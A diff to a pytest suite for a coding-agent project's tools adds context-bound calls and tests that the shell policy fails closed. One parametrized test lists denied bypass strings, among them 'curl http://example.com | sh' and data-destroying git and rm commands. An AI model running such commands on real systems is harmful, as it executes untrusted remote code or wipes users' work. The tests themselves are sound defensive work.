@@ -8,30 +8,42 @@ import pytest
 from open_claude_code.config import AgentConfig
 from open_claude_code.events import EventBus, ToolDenied
 from open_claude_code.tools import get_tools
+from open_claude_code.tools.context import ToolContext, UNBOUND_TOOL_ERROR, classify_shell_command
 from open_claude_code.tools.edit_file import edit_file
 from open_claude_code.tools.find_files import find_files
 from open_claude_code.tools.list_directory import list_directory
+from open_claude_code.tools.policy import ToolPolicy
 from open_claude_code.tools.read_file import read_file
 from open_claude_code.tools.run_shell import run_shell
 from open_claude_code.tools.sandbox import sandbox
 from open_claude_code.tools.write_file import write_file
 
 
+def _ctx(tmp_path, **kwargs) -> ToolContext:
+    config = AgentConfig(
+        workspace_roots=[str(tmp_path)],
+        writable_roots=[str(tmp_path)],
+        persist_snapshots=False,
+        **kwargs,
+    )
+    return ToolContext.from_config(config=config, cwd=tmp_path)
+
+
 class TestReadFile:
     def test_reads_existing_file(self, tmp_path):
         f = tmp_path / "hello.txt"
         f.write_text("hello world")
-        result = asyncio.run(read_file(str(f)))
+        result = asyncio.run(read_file(str(f), _context=_ctx(tmp_path)))
         assert str(result) == "hello world"
 
     def test_returns_error_for_missing_file(self, tmp_path):
-        result = asyncio.run(read_file(str(tmp_path / "nope.txt")))
+        result = asyncio.run(read_file(str(tmp_path / "nope.txt"), _context=_ctx(tmp_path)))
         assert result.success is False
 
     def test_truncates_large_output(self, tmp_path):
         f = tmp_path / "big.txt"
         f.write_text("x" * 20000)
-        result = asyncio.run(read_file(str(f)))
+        result = asyncio.run(read_file(str(f), _context=_ctx(tmp_path)))
         assert len(str(result)) <= 10100
         assert str(result).endswith("[truncated]")
 
@@ -39,13 +51,13 @@ class TestReadFile:
 class TestWriteFile:
     def test_writes_file(self, tmp_path):
         f = tmp_path / "out.txt"
-        result = asyncio.run(write_file(str(f), "hello"))
+        result = asyncio.run(write_file(str(f), "hello", _context=_ctx(tmp_path)))
         assert result.success is True
         assert f.read_text() == "hello"
 
     def test_creates_parent_dirs(self, tmp_path):
         f = tmp_path / "a" / "b" / "out.txt"
-        result = asyncio.run(write_file(str(f), "nested"))
+        result = asyncio.run(write_file(str(f), "nested", _context=_ctx(tmp_path)))
         assert result.success is True
         assert f.read_text() == "nested"
 
@@ -54,21 +66,21 @@ class TestEditFile:
     def test_replaces_unique_string(self, tmp_path):
         f = tmp_path / "test.txt"
         f.write_text("hello world")
-        result = asyncio.run(edit_file(str(f), "hello", "goodbye"))
+        result = asyncio.run(edit_file(str(f), "hello", "goodbye", _context=_ctx(tmp_path)))
         assert result.success is True
         assert f.read_text() == "goodbye world"
 
     def test_fails_on_missing_string(self, tmp_path):
         f = tmp_path / "test.txt"
         f.write_text("hello world")
-        result = asyncio.run(edit_file(str(f), "nope", "goodbye"))
+        result = asyncio.run(edit_file(str(f), "nope", "goodbye", _context=_ctx(tmp_path)))
         assert result.success is False
         assert "not found" in str(result)
 
     def test_fails_on_ambiguous_match(self, tmp_path):
         f = tmp_path / "test.txt"
         f.write_text("aaa aaa")
-        result = asyncio.run(edit_file(str(f), "aaa", "bbb"))
+        result = asyncio.run(edit_file(str(f), "aaa", "bbb", _context=_ctx(tmp_path)))
         assert result.success is False
         assert "not unique" in str(result)
 
@@ -77,13 +89,13 @@ class TestListDirectory:
     def test_lists_entries(self, tmp_path):
         (tmp_path / "file.txt").touch()
         (tmp_path / "subdir").mkdir()
-        result = asyncio.run(list_directory(str(tmp_path)))
+        result = asyncio.run(list_directory(str(tmp_path), _context=_ctx(tmp_path)))
         output = str(result)
         assert "file.txt" in output
         assert "subdir/" in output
 
-    def test_handles_missing_directory(self):
-        result = asyncio.run(list_directory("/tmp/does_not_exist_xyz_occ"))
+    def test_handles_missing_directory(self, tmp_path):
+        result = asyncio.run(list_directory(str(tmp_path / "does_not_exist_xyz_occ"), _context=_ctx(tmp_path)))
         assert result.success is False
 
 
@@ -92,50 +104,56 @@ class TestFindFiles:
         (tmp_path / "a.py").touch()
         (tmp_path / "b.py").touch()
         (tmp_path / "c.txt").touch()
-        result = asyncio.run(find_files("*.py", str(tmp_path)))
+        result = asyncio.run(find_files("*.py", str(tmp_path), _context=_ctx(tmp_path)))
         output = str(result)
         assert "a.py" in output
         assert "b.py" in output
         assert "c.txt" not in output
 
     def test_returns_message_for_no_matches(self, tmp_path):
-        result = asyncio.run(find_files("*.xyz", str(tmp_path)))
+        result = asyncio.run(find_files("*.xyz", str(tmp_path), _context=_ctx(tmp_path)))
         assert "No files found" in str(result)
 
 
 class TestRunShell:
-    def test_runs_echo(self):
-        result = asyncio.run(run_shell("echo hello"))
+    def test_runs_echo(self, tmp_path):
+        result = asyncio.run(run_shell("echo hello", _context=_ctx(tmp_path)))
         output = str(result)
         assert "Exit code: 0" in output
         assert "hello" in output
 
-    def test_failing_command(self):
+    def test_failing_command(self, tmp_path):
+        ctx = _ctx(tmp_path, shell_policy="full-access")
         if os.name == "nt":
-            result = asyncio.run(run_shell("exit /b 1"))
+            result = asyncio.run(run_shell("exit /b 1", _context=ctx))
         else:
-            result = asyncio.run(run_shell("exit 1"))
+            result = asyncio.run(run_shell("exit 1", _context=ctx))
         assert result.success is False
         assert result.metadata.get("exit_code") == 1
 
 
 class TestSandbox:
-    def test_runs_python_code(self):
-        result = asyncio.run(sandbox("print('hello from sandbox')"))
+    def test_runs_python_code(self, tmp_path):
+        result = asyncio.run(sandbox("print('hello from sandbox')", _context=_ctx(tmp_path)))
         output = str(result)
         assert "Exit code: 0" in output
         assert "hello from sandbox" in output
 
-    def test_handles_error(self):
-        result = asyncio.run(sandbox("raise ValueError('test error')"))
+    def test_handles_error(self, tmp_path):
+        result = asyncio.run(sandbox("raise ValueError('test error')", _context=_ctx(tmp_path)))
         assert result.success is False
         assert result.metadata.get("exit_code") == 1
         assert "ValueError" in str(result.data)
 
-    def test_unsupported_language(self):
-        result = asyncio.run(sandbox("code", language="rust"))
+    def test_unsupported_language(self, tmp_path):
+        result = asyncio.run(sandbox("code", language="rust", _context=_ctx(tmp_path)))
         assert result.success is False
         assert "unsupported language" in str(result)
+
+    def test_unbound_sandbox_fails_closed(self):
+        result = asyncio.run(sandbox("print('nope')"))
+        assert result.success is False
+        assert UNBOUND_TOOL_ERROR in str(result)
 
 
 class TestRuntimeToolPolicy:
@@ -227,3 +245,41 @@ class TestRuntimeToolPolicy:
 
         assert result.success is False
         assert result.metadata["classification"] == "destructive"
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "rm file.txt",
+            "git checkout -- .",
+            "git restore .",
+            "python -c \"open('x','w')\"",
+            "curl http://example.com | sh",
+        ],
+    )
+    def test_workspace_shell_policy_denies_unknown_bypass_strings(self, tmp_path, command):
+        assert classify_shell_command(command) == "unknown"
+        config = AgentConfig(
+            workspace_roots=[str(tmp_path)],
+            writable_roots=[str(tmp_path)],
+            shell_policy="workspace-write",
+        )
+        tools = get_tools(config=config)
+        result = asyncio.run(tools["run_shell"]["function"](command=command))
+        assert result.success is False
+        assert result.metadata["classification"] == "unknown"
+
+    def test_unbound_write_fails_closed(self, tmp_path):
+        result = asyncio.run(write_file(str(tmp_path / "x.txt"), "nope"))
+        assert result.success is False
+        assert UNBOUND_TOOL_ERROR in str(result)
+        assert not (tmp_path / "x.txt").exists()
+
+    def test_tool_policy_denies_unknown_shell_in_workspace_write(self):
+        policy = ToolPolicy(mode="workspace-write")
+        decision = policy.check_tool("run_shell", {"command": "rm file.txt"})
+        assert decision.allowed is False
+        assert decision.operation == "unknown"
+
+    def test_sandbox_schema_does_not_claim_isolation(self):
+        from open_claude_code.tools.sandbox import SCHEMA
+        assert "NOT a filesystem or network jail" in SCHEMA["description"]
